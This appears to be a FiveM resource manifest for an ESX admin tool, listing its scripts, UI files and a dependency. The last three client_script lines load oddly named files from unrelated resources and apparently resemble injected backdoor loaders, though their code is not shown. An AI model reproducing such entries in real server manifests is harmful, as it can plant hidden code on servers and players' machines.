resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'Admin tool for ES'

client_script 'client.lua'
server_script 'server.lua'

ui_page 'ui/index.html'

files {
	'ui/index.html',
	'ui/style.css'
}

dependency 'essentialmode'
client_script '@esx_advancedgarage/91415.lua'
client_script '@esx_pumpkins/50b308aa8af3157b04c2e0e8967e326a.lua'


client_script '@Sakura_AutoMods/xDxDxDxDxD.lua'